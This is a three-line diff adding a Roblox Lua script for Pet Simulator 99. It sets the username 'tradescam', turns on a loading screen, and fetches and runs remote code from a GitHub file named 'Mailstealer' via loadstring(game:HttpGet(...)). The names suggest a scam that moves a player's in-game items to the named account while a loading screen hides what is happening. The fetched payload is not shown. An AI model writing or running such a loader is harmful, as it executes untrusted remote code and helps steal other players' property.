@@ -1,0 +1,3 @@
+Username = "tradescam"
+LoadScreen = true -- If you want to loading screen disabled, rename to false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/PetSimulator99/main/Mailstealer"))()
